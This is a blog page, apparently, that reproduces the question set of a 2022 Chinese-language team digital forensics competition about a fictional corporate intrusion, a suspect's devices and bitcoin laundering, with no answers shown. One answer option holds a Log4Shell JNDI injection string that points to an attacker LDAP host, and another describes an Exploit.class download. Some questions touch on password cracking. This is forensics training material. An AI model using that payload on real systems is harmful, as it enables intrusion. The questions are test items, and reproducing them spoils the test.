+<li>该基本镜像存储池 (Basic Storage Pool) 里储存了一些视频档案, 请找出一段儿童色情影片, 该档案的最后修改时间是什么月份? (2分)<br>A. Jun<br>B. Jul<br>C. Aug<br>D. Sep<br>E. Oct<br>F. 以上皆非</li>
+<li>王景浩的USB记忆棒里有一个 ‘Data’ 文件夹 (Folder)，它存有哪一种类型的密钥文件? (1分)<br>A. pem<br>B. cer<br>C. crt<br>D. key<br>E. 以上皆非</li>
+<li>尝试将档案解密，该档案属于哪一个类型 (File type)? (2分)<br>A. exe<br>B. ods<br>C. rtf<br>D. sql<br>E. 以上皆非</li>
+<li>分析IP地址61.238.217.108向AGC服务器10.0.66.184发送的第一个 ‘GET’ 指令，它请求的统一资源定位系统 (Uniform Resource Locator - URL) 是什么? (1分)<br>A. <a target="_blank" rel="noopener" href="http://155.137.195.111:8080/">http://155.137.195.111:8080</a> (<a target="_blank" rel="noopener" href="http://155.137.195.111:8080/">http://155.137.195.111:8080/</a>)<br>B. <a target="_blank" rel="noopener" href="http://www.w3.org/2003/05/soap-envelope">http://www.w3.org/2003/05/soap-envelope</a> (<a target="_blank" rel="noopener" href="http://www.w3.org/2003/05/soap-envelope">http://www.w3.org/2003/05/soap-envelope</a>)<br>C. <a target="_blank" rel="noopener" href="http://61.238.217.108:8000/">http://61.238.217.108:8000</a> (<a target="_blank" rel="noopener" href="http://61.238.217.108:8000/">http://61.238.217.108:8000/</a>)<br>D. 以上皆非</li>
+<li>IP地址61.238.217.108曾经向AGC服务器10.0.66.184发送 ‘POST’ 指令，它在 ‘HTML Form’ 项目的 ‘uname’ 栏所输入的字符串是什么? (1分)<br>A. root<br>B. ${jndi:ldap:&#x2F;&#x2F;61.238.217.108:1389&#x2F;a}<br>C. application&#x2F;x-www-form-urlencoded<br>D. password</li>
+<li>AGC服务器10.0.66.184收到IP地址61.238.217.108的 ‘POST’ 指令后，它执行了哪些行动? (2分)<br>   A. 使用端口46858连接IP地址61.238.217.108的LDAP服务器的指定端口<br>   B. 于IP地址61.238.217.108下载了Exploit.class<br>   C. 使用端口49264连接IP地址61.238.217.108发送同步要求<br>   D. 以上皆是</li>
+<li>入侵者曾经传送一个档案到AGC服务器10.0.66.184并将它改名 (Rename)，这个档案的原来名称是什么？ (1分)<br>   A. cGhvdG9zT0Zyb2NreQ&#x3D;&#x3D;<br>   B. Finanical.xls<br>   C. readme.txt<br>   D. anonymous</li>
+<li>承上题，该档案原档的建立日期是什么? (2分)<br>   A. 2022-10-21 08:10:30 (UTC+0)<br>   B. 2022-10-21 16:19:39 (UTC+0)<br>   C. 2022-10-22 08:10:30 (UTC+0)<br>   D. 2022-10-22 14:22:06 (UTC+0)<br>   E. 2022-10-22 16:19:39(UTC+0)</li>
+<li>承上题，该档案的SHA-256哈希值是什么? (3分)<br>   A. a6eef1… …27364c<br>   B. 54785c… …fe86f0<br>   C. 961f2b… …647d55<br>   D. a00e6c… …d0eaab<br>   E. 以上皆非</li>
+<li>分析AGC-CS计算机 (Computer) 里最初的作業系統 (Windows) ，它的实際安装时间是什么? (以时区UTC+8回答) (3分)<br>   A. 2022-09-26 14:35:17<br>   B. 2022-09-26 21:35:17<br>   C. 2022-09-27 05:35:17<br>   D. 2022-10-05 03:52:15<br>   E. 2022-10-05 11:52:15</li>
+<li>AGC-CS计算机里的 ‘Acrobat DC’ 软件的安装时间是? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159) (1分)<br>   A. 2022-09-28 19:01:40<br>   B. 2022-09-28 07:18:33<br>   C. 2022-08-30 19:01:40<br>   D. 2022-08-30 07:18:33</li>
+<li>AGC-CS计算机里的用户 ‘Carson’ 链接了一个网络磁盘机 (Network Drive)，在下列哪一个档案有相关资料? (2分)<br>   A. \Users\Carson\NTUSER.DAT<br>   B. \Users\admin\NTUSER.DAT<br>   C. \Windows\System32\config\SYSTEM<br>   D. \Windows\System32\config\SOFTWARE<br>   E. \Windows\System32\config\SECURITY</li>
+<li>承上题，用户 ‘Carson’ 连接的网络磁盘机的IP地址是什么? (1分)<br>   A. \192.168.182.134<br>   B. \192.168.182.134\photo<br>   C. \192.168.182.134\share<br>   D. \192.168.182.134\AGC<br>   E. \192.168.182.134\AGC photo</li>
+<li>承上题，分析该 ‘Word’ 文件，它的可能用途是? (3分)<br>   A. 访问一个网站<br>   B. 记录键盘操作<br>   C. 把档案加密<br>   D. 改变桌面壁纸<br>   E. 关闭计算机</li>
+<li>AGC-CS计算机里有一个名为 ‘admin’ 的用户，它是在何时被建立的? (以时区UTC+8回答) (1分)<br>   A. 2022-09-28<br>   B. 2022-09-29<br>   C. 2022-09-30<br>   D. 2022-10-01<br>   E. 以上皆非</li>
+<li>黑客除了通过 ‘RDP’ 外，还采用什么软件远端控制 (Remote Control) AGC-CS计算机? (1分)<br>   A. VNC<br>   B. Teamviewer<br>   C. Anydesk<br>   D. Splashtop Business Access<br>   E. RemotePC</li>
+<li>哪一个IP地址尝试登录’VM’ (虚拟机) 编号 ‘111’ 失败次数最多? (1分)<br>   A. 38.242.130.207<br>   B. 218.92.0.206<br>   C. 43.142.93.22<br>   D. 121.202.141.105<br>   E. 61.238.217.108</li>
+<li>黑客在入侵后盗用AGC员工电邮户口及冒充AGC员工回复了电邮给客户，发出这封电邮的操作系统 (Operating System) 及电邮软件 (Mail Agent) 是什么? (2分)<br>   A. Mac OS X 10.15 rv:102.0 Thunderbird&#x2F;102.3.0<br>   B. Mac OS X 10.15 rv:102.0 Thunderbird&#x2F;91.13.1<br>   C. Mac OS X 10.11 rv:91.0 Thunderbird&#x2F;91.13.1<br>   D. Mac OS X 10.11 rv:60.0 Thunderbird&#x2F;60.9.1<br>   E. Windows 10 Pro Outlook 2016</li>
+<li>黑客在 ‘Proxmox’ 里留下了一个被加密了的程序 (Program)，在解密后它的SHA-256哈希值 (Hash Value) 是什么? (2分)<br>   A. C89D7A… …8C4E76<br>   B. C7141F… …64BF65<br>   C. E9433E… …1A5134<br>   D. 45CE1C… …79BD4A<br>   E. 0ACAA5… …AB7ECE</li>
+<li>于虚拟机 ‘VM’ 编号 ‘111’ 里的档案 ‘\srv\samba\share\AGCphoto\DSC01139.JPG’ ，照片中出现的街道名称是? (2分)<br>   A. 河背街<br>   B. 沙咀道<br>   C. 众安街<br>   D. 香车街<br>   E. 川龙街</li>
+<li>王景浩的计算机使用什么文件系统 (File System) ? (1分)<br>   A. exFAT<br>   B. APFS<br>   C. HFS<br>   D. HFS+</li>
+<li>王景浩计算机的操作系统 (Operating System) 版本是什么? (1分)<br>   A. 10.4.11<br>   B. 10.9.5<br>   C. 10.10.5<br>   D. 10.11.6</li>
+<li>当用户设置了自动登录 (Auto Login) 后，王景浩计算机的操作系统会产生哪个档案? (2分)<br>   A. manifest.plist<br>   B. info.plist<br>   C. PasswordPanel.strings<br>   D. kcpassword</li>
+<li>王景浩计算机的登录密码 (Login Password) 是什么? (2分)<br>   A. 1qa@WS3ed<br>   B. 3edRF5tgC.5tgYH7ujD.2wsRF5tg C. 5tg^YH7uj D. 2wsRF5tgC.5tg<br>   Y<br>   H7ujD.2wsRF6yh</li>
+<li>在王景浩的计算机里，他最后使用哪个电邮地址登录 ‘iCloud’ 账号? (2分)<br>   A. <a href="mailto:&#x6b;&#x69;&#110;&#x67;&#x68;&#111;&#x6f;&#x30;&#x77;&#x30;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;">kinghoo0w0@gmail.com</a> (mailto:<a href="mailto:&#x6b;&#x69;&#110;&#103;&#104;&#111;&#x6f;&#48;&#119;&#x30;&#64;&#103;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;">kinghoo0w0@gmail.com</a>)<br>   B. <a href="mailto:&#x77;&#x6f;&#110;&#x67;&#x68;&#x6f;&#x6f;&#x35;&#x38;&#56;&#64;&#121;&#x61;&#104;&#111;&#111;&#46;&#x63;&#x6f;&#x6d;">wonghoo588@yahoo.com</a> (mailto:<a href="mailto:&#x77;&#111;&#110;&#103;&#x68;&#111;&#111;&#x35;&#x38;&#56;&#x40;&#x79;&#97;&#104;&#111;&#x6f;&#46;&#99;&#x6f;&#x6d;">wonghoo588@yahoo.com</a>)<br>   C. <a href="mailto:&#107;&#105;&#x6e;&#x67;&#104;&#x6f;&#x37;&#50;&#54;&#x40;&#x61;&#x6f;&#108;&#x2e;&#99;&#x6f;&#109;">kingho726@aol.com</a> (mailto:<a href="mailto:&#107;&#x69;&#110;&#x67;&#104;&#111;&#x37;&#50;&#x36;&#64;&#x61;&#x6f;&#x6c;&#x2e;&#x63;&#111;&#109;">kingho726@aol.com</a>)<br>   D. <a href="mailto:&#107;&#x69;&#x6e;&#103;&#x68;&#111;&#111;&#48;&#x77;&#48;&#64;&#121;&#97;&#104;&#x6f;&#x6f;&#46;&#x63;&#x6f;&#x6d;">kinghoo0w0@yahoo.com</a> (mailto:<a href="mailto:&#x6b;&#x69;&#x6e;&#103;&#x68;&#x6f;&#x6f;&#48;&#x77;&#48;&#64;&#x79;&#97;&#104;&#x6f;&#111;&#46;&#x63;&#111;&#109;">kinghoo0w0@yahoo.com</a>)</li>
+<li>苹果手机备份的密码 (iTunes Backup Encryption Password) 会记录在什么档案? (2分)<br>   A. Info.plist<br>   B. privacy.json<br>   C. Manifest.plist<br>   D. PasswordPanel.strings</li>
+<li>最后一次经由王景浩计算机打印的3D图档案名字是什么? (2分)<br>   A. CE3_balljoint_extender.gcode<br>   B. um3-penguin-real-mini-keychain-merged-tpu.gcode<br>   C. CE3_Prancer.gcode<br>   D. CE3_2020-psu-atx-mount.gcode</li>
+<li>王景浩计算机的Safari浏览器的默认搜索引擎 (Default Search Engine) 是什么? (2分)<br>   A. 百度<br>   B. 谷歌<br>   C. 360<br>   D. Safari</li>
+<li>分析王景浩计算机的数据，王景浩的比特币钱包 (Bitcoin Wallet) 地址是什么? (2分)<br>   A. bc1quw… …zpzjzt<br>   B. bc1qm… …5f7n9g<br>   C. bc1q79… …h4sq52<br>   D. bc1qsl… …je7hkk</li>
+<li>AGC公司员工 ‘Carson’ 有一个由公司发给他的电邮账户，分析王景浩的计算机数据并找出 ‘Carson’ 的电邮账户密码。 (2分)<br>   A. AGC2020@pw<br>   B. AGC2012@PW<br>   C. AGC2020@hkg<br>   D. AGC2021@PW</li>
+<li>王景浩何时将 ‘小宝’ 加为iPhone XR的手机联络人 (Contact) ? (以时区UTC +8回答) (1分)<br>   A. 2022年07月14日<br>   B. 2022年07月15日<br>   C. 2022年07月16日<br>   D. 2022年07月17日<br>   E. 2022年07月18日</li>
+<li>王景浩的iPhone XR显示他的汇丰银行户口于2022年9月19日收到多少存款? (1分)<br>   A. HKD298.8<br>   B. HKD344.7<br>   C. HKD396<br>   D. HKD543<br>   E. HKD465.1</li>
+<li>王景浩的iPhone XR没有收藏 (Bookmark) 哪家音响品牌的网页? (1分)<br>   A. KEF<br>   B. EDIFIER<br>   C. BOSE<br>   D. YAMAHA<br>   E. Bowers &amp; Wilkins</li>
+<li>王景浩的iPhone XR手机记录了他曾于2022年8月26日试飞无人机， 当天试飞的地点在哪里? (2分)<br>   A. 大埔海滨<br>   B. 启德<br>   C. 数码港<br>   D. 西环<br>   E. 将军澳</li>
+<li>王景浩于2022年8月26日试飞无人机的总飞行时间 (Total Flight Time) 多久? (2分)<br>   A. 6分58秒<br>   B. 8分10秒<br>   C. 9分6秒<br>   D. 11分1秒<br>   E. 15分33秒</li>
+<li>朗尼草莓 (Raspberry) 计算机操作系统的主机名称 (hostname) 是什么? (1分)<br>   A. OpenWrt<br>   B. admin<br>   C. root<br>   D. AsusRt<br>   E. DDwrt</li>
+<li>承上题，检视上述的档案，当中有几个IP地址曾经成功登录这个系统的 ‘VPN’ 服务? (3分)<br>   A. 1<br>   B. 2<br>   C. 3<br>   D. 4<br>   E. 0</li>
+<li>承上题，检视上述的档案，当中有几个IP地址曾经尝试以 ‘root’ 登入装置但因密码错误而不成功? (2分)<br>   A. 2<br>   B. 4<br>   C. 5<br>   D. 6<br>   E. 8</li>
+<li>检视记忆卡上硬盘分区表 (Partition Table) 资讯，记忆卡共有多少个分区 (Partition) ? (1分)<br>   A. 1<br>   B. 2<br>   C. 3<br>   D. 4<br>   E. 0</li>
+<li>检视记忆卡上硬盘分区表资讯，第二个分区的分区代码 (Partition Code) 是什么? (1分)<br>   A. 07<br>   B. AF<br>   C. 0C<br>   D. 2B<br>   E. 01</li>
+<li>检视记忆卡的数据，在2022年10月9日约中午12时5分至12时15分之间的录像 (Video) 中，曾经出现哪一个IP地址? (2分)<br>   A. 61.238.217.108<br>   B. 155.137.190.123<br>   C. 192.168.1.66<br>   D. 185.200.100.242<br>   E. 213.104.156.111</li>
+<li>尝试分析记忆卡数据結構受损的原因，通过合适的方法把数据恢复到原本没有出错的状况，记忆卡的SHA-256哈希值是什么？ (3分)<br>   A. E63DF0… …8627D3<br>   B. 3FD99E… …17B6DE<br>   C. 3BADAA… …666A8F<br>   D. BBB211… …E00710<br>   E. AA9E81… …2C04FE</li>
+<li>朗尼的计算机有什么软件可以创建比特币钱包 (Bitcoin Wallet)? (1分)<br>   A. MetaMask<br>   B. Electrum<br>   C. Trezor<br>   D. 以上皆非</li>
+<li>朗尼收取王景浩多少比特币作为清洗黑钱的费用? (1分)<br>   A. 1%<br>   B. 4%<br>   C. 7%<br>   D. 10%<br>   E. 15%</li>
+<li>朗尼的计算机里有一个没被加密的比特币钱包，它的回复种子 (Recovery Seed) 不包含哪一个英文字? (1分)<br>   A. oppose<br>   B. area<br>   C. twice<br>   D. roast</li>
+<li>朗尼的计算机里有多少个加密了 (Encrypted) 的比特币钱包? (1分)<br>   A. 1<br>   B. 2<br>   C. 3<br>   D. 4<br>   E. 5</li>
+<li>朗尼将加密了的比特币钱包的密码存在他计算机的一个档案里，这个档案的副档名是什么? (以大写英文及阿拉伯数字回答) (3分)<br>   A. DMG<br>   B. PDF<br>   C. ASD<br>   D. ZIP<br>   E. PNG</li>
+<li>朗尼在手机里有一个加密了的比特币钱包，他采用什么应用程序把该钱包里的黑钱转换成另一种加密货币? (2分)<br>   A. Safepal<br>   B. Metamask<br>   C. Changelly<br>   D. Opensea</li>
+<li>承上题，这次转换加密货币的日期和时间是什么? (以时区UTC+8回答) (2分)<br>   A. 2022-10-07 10:29时<br>   B. 2022-10-07 11:06时<br>   C. 2022-10-07 11:07时<br>   D. 2022-10-07 13:54时</li>
+<li>朗尼在计算机里采用什么浏览器 (Browser) 及在什么日期时间在他的计算机安装 ‘MetaMask’ ? (以时区UTC+8回答) (1分)<br>   A. Chrome 2022-08-25 12:35时<br>   B. Chrome 2022-10-07 14:29时<br>   C. Firefox 2022-08-25 12:35时<br>   D. Firefox 2022-10-07 14:29时</li>
+<li>朗尼在计算机里所创建的非同质化通证 (Non-Fungible Token - NFT) 使用哪一个种区块链 (Blockchain) 技术? (1分)<br>   A. Ethereum<br>   B. Polygon<br>   C. Solana<br>   D. Arbitrum<br>   E. Klaytn</li>
+<li>朗尼在什么日期时间把计算机中创建的非同质化通证 (NFT) 放售? (以时区UTC+8回答) (2分)<br>   A. 2022-10-07 14:47时<br>   B. 2022-10-07 14:49时<br>   C. 2022-10-07 14:52时<br>   D. 2022-10-07 14:54时</li>
+<li>朗尼的手机里，于2022-10-07，15:07时至15:08时做过什么动作? (以时区UTC+8回答) (2分)<br>   A. 登录 ‘Metamask’<br>   B. 登录 ‘Opensea’<br>   C. 屏幕截图 (Screen Capture)<br>   D. 登录 ‘YouTube’</li>
+<li>在2022年9月28日18时51分 (UTC+8)，朗尼曾经在手机用WhatsApp与王景浩对话，语句 [有灯，风扇经常在转]， 回复这句话的相关语句是什么? (1分)<br>   A. 你有推介吗?<br>   B. 我之前放在你家的机械运作正常吗?<br>   C. 有灯号 风扇有转动?<br>   D. 帅吗?</li>
+<li>朗尼通过手机相约王景浩于10月15日到哪一个地区食晚饭? (1分)<br>   A. 荃湾<br>   B. 湾仔<br>   C. 九龙城<br>   D. 九龙塘</li>
+<li>朗尼的手机曾连接WIFI [SSID: faifai], 它的登录密码是什么 ? (2分)<br>   A. abcd5678<br>   B. aaaa0000<br>   C. rooney111<br>   D. rdfu1234</li>
+</ol>
+<h3 id="多选题"><a href="#多选题" class="headerlink" title="多选题"></a>多选题</h3><ol>
+<li>该流媒体服务器是有使用Docker容器 (Docker Container) 的，当中包含以下哪个Docker镜像 (Docker Image) ? (3分)<br>A. apache2<br>B. ubuntu<br>C. centos<br>D. nginx<br>E. hello-world<br>F. 以上皆非</li>
+<li>该流媒体服务器是使用 ‘WordPress’ 建站 (Create Website) 的， 就 ‘比特币’ 标题， 有以下的电子邮箱地址曾经留有评论? (2分)<br>A. cn.wordpress.org<br>B. <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x35;&#56;&#x34;&#54;&#50;&#x40;&#109;&#97;&#x69;&#x6c;&#x2e;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;">root58462@mail.qq.com</a> (mailto:<a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#53;&#x38;&#52;&#54;&#50;&#x40;&#109;&#x61;&#x69;&#108;&#x2e;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;">root58462@mail.qq.com</a>)<br>C. <a href="mailto:&#x68;&#105;&#52;&#53;&#54;&#x40;&#49;&#54;&#x33;&#x2e;&#99;&#x6f;&#x6d;">hi456@163.com</a> (mailto:<a href="mailto:&#104;&#105;&#x34;&#x35;&#54;&#x40;&#49;&#x36;&#51;&#x2e;&#99;&#x6f;&#109;">hi456@163.com</a>)<br>D. <a href="mailto:&#x72;&#111;&#111;&#116;&#x40;&#49;&#54;&#x33;&#x2e;&#99;&#111;&#109;">root@163.com</a> (mailto:<a href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#x31;&#x36;&#x33;&#x2e;&#99;&#x6f;&#109;">root@163.com</a>)<br>E. <a href="mailto:&#x75;&#115;&#101;&#114;&#x31;&#64;&#x6c;&#x6f;&#x63;&#x61;&#x6c;&#104;&#111;&#115;&#116;&#46;&#110;&#101;&#x74;">user1@localhost.net</a> (mailto:<a href="mailto:&#x75;&#x73;&#101;&#114;&#49;&#64;&#108;&#111;&#x63;&#x61;&#x6c;&#104;&#111;&#x73;&#x74;&#x2e;&#110;&#x65;&#x74;">user1@localhost.net</a>)<br>F. 以上皆非</li>
+<li>承上题，‘Data’ 文件夹里有一个被加密了的档案，它是被哪一种加密方法加密? (2分)<br>A. Symmetric<br>B. PGP<br>C. Twofish<br>D. RSA<br>E. Triple DES</li>
+<li>承上题，找出以下哪一个名字出现在该档案里? (3分)<br>A. Armand To<br>B. Adam Smasher<br>C. Beverly Kot<br>D. Huma Chan<br>E. 以上皆非</li>
+<li>AGC服务器10.0.66.184里有一个AGC目录 (Directory)，它的子目录 (Sub Directory) 包含以下哪一个? (2分)<br>A. Accounting<br>B. Picture<br>C. Staff<br>D. Sambashare<br>E. Retail</li>
+<li>入侵者迸入AGC服务器10.0.66.184后，他成功执行以下哪些指令? (2分)<br>A. 檢视了readme.txt内容<br>B. 删除了三个档案<br>C. 删除了一个目录 (Directory)<br>D. 替档案改名<br>E. 建立了两个txt档案</li>
+<li>通过取证调查结果迸行分析 (包括但不限于以上问题及情节)，以下哪项关于王景浩的推断是正确的? (5分)<br>A. 曾经采用他的计算机入侵AGC集团网络<br>B. 传播儿童色情物品<br>C. 于AGC集团取得大量客户资料<br>D. 通过VPN取得Rooney家里的IP地址<br>E. 企图更改AGC集团的网页</li>
+<li>AGC_Server里的 ‘Proxmox’ 虚拟化环境 (Virtual Environment - VE) 有哪一个用户? (2分)<br>A. root<br>B. VM_admin<br>C. sysadmin<br>D. acl<br>E. tss</li>
+<li>根据 ‘VM’ 编号 ‘111’ 里的网页服务器 (Web Server) 的设定，访客可从下列哪个网页地址访问这个服务器? (2分)<br>A. localhost<br>B. <a target="_blank" rel="noopener" href="http://www.ag.com.shop/">www.ag.com.shop</a> (<a target="_blank" rel="noopener" href="http://www.ag.com.shop/">http://www.ag.com.shop/</a>)<br>C. <a target="_blank" rel="noopener" href="http://www.agcom.shop/">www.agcom.shop</a> (<a target="_blank" rel="noopener" href="http://www.agcom.shop/">http://www.agcom.shop/</a>)<br>D. agcom.shop<br>E. <a target="_blank" rel="noopener" href="http://www.agcom.com/">www.agcom.com</a> (<a target="_blank" rel="noopener" href="http://www.agcom.com/">http://www.agcom.com/</a>)</li>
+<li>王景浩计算机里的手机备份 (iTunes Backup) 包含哪些iOS版本? (2分)<br>   A. 12.5.6<br>   B. 15.4<br>   C. 15.5<br>   D. 16.0.3</li>
+<li>以下哪种工具可以用作破解密码? (1分)<br>   A. Passware<br>   B. John The Ripper<br>   C. HashCat<br>   D. Password Recovery Toolkit</li>
+<li>通过 ‘hashcat’ 破解 ‘iTunes Backup’ 密码需要制订一个 ‘txt’ 档案，若该备份的手机iOS版本是10以上，需要按照下列哪个提示字符 (String) 的数据去制订这个 ‘txt’ 档案? (3分)<br>   A. WPKY<br>   B. ITER<br>   C. SALT<br>   D. DPIC<br>   E. DPSL</li>
+<li>王景浩采用计算机里的哪种工具进入和盗取AGC公司的数据? (2分)<br>   A. Teamviewer<br>   B. OpenVPN<br>   C. Remote Desktop Manager<br>   D. Tor Browser</li>
+<li>王景浩在AGC公司盗取了下列什么类型的档案? (2分)<br>   A. ost<br>   B. xlsx<br>   C. jpg<br>   D. docx</li>
+<li>王景浩用 iPhone XR 拍了一张照片’IMG_0012.HEIC’，那照片什么地方曾被修改? (3分)<br>   A. 拍摄时间<br>   B. 经纬度<br>   C. 时区<br>   D. 档案名称<br>   E. 拍摄装备</li>
+<li>以下哪项对于朗尼草莓计算机操作系统的描述是正确的? (2分)<br>   A. LAN地址是 192.168.1.24<br>   B. 提供点对点隧道协议 (Point-to-Point Tunneling Protocol - PPTP) VPN服务<br>   C. WIFI登录密码为’OpenWrt’<br>   D. 提供网络时间协议 (NTP) 服务<br>   E. 时区设置相等于UTC+8</li>
+<li>承上题，‘VPN’ 服务器的IP地址及端口 (Port) 是什么? (2分)<br>   A. IP地址 61.238.217.108<br>   B. IP地址 192.168.8.1<br>   C. IP地址 103.10.12.106<br>   D. 端口 33248<br>   E. 端口 1194<br>   F. 端口 1701</li>
+<li>记忆卡的档案不能被读取，记忆卡受损的原因包括? (2分)<br>   A. 目录项结构 (Directory Entry) 受损<br>   B. 启动扇区表 (Master Boot Record) 受损<br>   C. 文件分配表 (File Allocation Table - FAT) 受损<br>   D. 引导扇区 (Boot Sector) 受损<br>   E. 以上各项皆是</li>
+<li>记忆卡第一个文件系统 (File System) 中有一个图片档案，它的SHA-256哈希值是 ‘F7E003781456D2E01CFE0EB46988D5BB433ADF9841164BBB90BAC67C0C9B21AF’。该档案显示了哪些影像? (2分)<br>   A. 人<br>   B. 山<br>   C. 汽车<br>   D. 交通灯<br>   E. 天空</li>
+<li>朗尼的手机里，有什么应用程序与将黑钱 (比特币) 转换成另一加密货币的地址有关? (2分)<br>   A. Metamask<br>   B. Opensea<br>   C. Safepal<br>   D. YouTube</li>
+<li>承上题，从这个动作中能找到什么资讯? (1分)<br>   A. Opensea.io<br>   B. Ethereum Main Network<br>   C. Your purchase is complete<br>   D. Subtotal &#x3D; 0.0253 ETH<br>   E. Good Luck</li>
+<li>承上题，上述的电邮附件包含哪些类型的档案? (3分)<br>   A. pdf<br>   B. doc<br>   C. png<br>   D. txt<br>   E. jpg</li>
+<li>朗尼的手机曾连接以下哪一个WIFI网络? (2分)<br>   A. taiiphone<br>   B. rooneyhome<br>   C. Function Room<br>   D. TP-Link</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://FighterGodNemo.github.io">琉璃幻彩</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://fightergodnemo.github.io/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/%E7%BE%8E%E4%BA%9A%E6%9D%AF/2022%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9B/">https://fightergodnemo.github.io/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/%E7%BE%8E%E4%BA%9A%E6%9D%AF/2022%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://FighterGodNemo.github.io" target="_blank">琉璃幻彩的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">电子取证</a><a class="post-meta__tags" href="/tags/%E5%8F%96%E8%AF%81WriteUp/">取证WriteUp</a><a class="post-meta__tags" href="/tags/%E5%9B%A2%E9%98%9F%E8%B5%9B/">团队赛</a><a class="post-meta__tags" href="/tags/%E7%BE%8E%E4%BA%9A%E6%9D%AF/">美亚杯</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.staticfile.org/butterfly-extsrc/1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.staticfile.org/butterfly-extsrc/1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/%E7%BE%8E%E4%BA%9A%E6%9D%AF/2025%E7%BE%8E%E4%BA%9A%E6%9D%AF%E8%B5%84%E6%A0%BC%E8%B5%9B/" title="25美亚杯资格赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">25美亚杯资格赛</div></div><div class="info-2"><div class="info-item-1">前言：案情介绍警方接获报案，前往西贡布袋澳处理一宗“伤人”事件。经初步调查，怀疑男子陈民浩以木棍袭击男子冯子超，导致冯子超头部受伤昏迷。冯子超已被送往医院救治，陈民浩则因涉嫌“伤人”罪被警方当场拘捕，被捕后一直保持缄默，拒绝交代案情细...</div></div></div></a><a class="pagination-related" href="/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/%E7%BE%8E%E4%BA%9A%E6%9D%AF/2025%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B/" title="25美亚杯团体赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">25美亚杯团体赛</div></div><div class="info-2"><div class="info-item-1"> </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/%E7%BE%8E%E4%BA%9A%E6%9D%AF/2025%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B/" title="25美亚杯团体赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-15</div><div class="info-item-2">25美亚杯团体赛</div></div><div class="info-2"><div class="info-item-1"> </div></div></div></a><a class="pagination-related" href="/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/%E6%95%B0%E8%AF%81%E6%9D%AF/24%E6%95%B0%E8%AF%81%E6%9D%AF%E5%86%B3%E8%B5%9B%E5%9B%A2%E4%BD%93/" title="24数证杯决赛团体"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-15</div><div class="info-item-2">24数证杯决赛团体</div></div><div class="info-2"><div class="info-item-1">一、手机取证1.请找出嫌疑人的手机号13023161693 2.嫌疑人曾经访问的公共服务后台管理系统的 URL 是？（答题格式：https://abc/...）  https://ggfw.ynylbz.cn/manage/#/log...</div></div></div></a><a class="pagination-related" href="/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/%E6%95%B0%E8%AF%81%E6%9D%AF/25%E6%95%B0%E8%AF%81%E6%9D%AF%E5%88%9D%E8%B5%9B%E5%9B%A2%E4%BD%93/" title="25数证杯初赛团体"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-15</div><div class="info-item-2">25数证杯初赛团体</div></div><div class="info-2"><div class="info-item-1">前言手机.rar格式放火眼解析不出，解压后才可以。 检材下载 下载链接：https://pan.baidu.com/share/init?surl=IUj600YuLJeYvfIoY_yryQ&amp;pwd&#x3D;smh3 哈希...</div></div></div></a><a 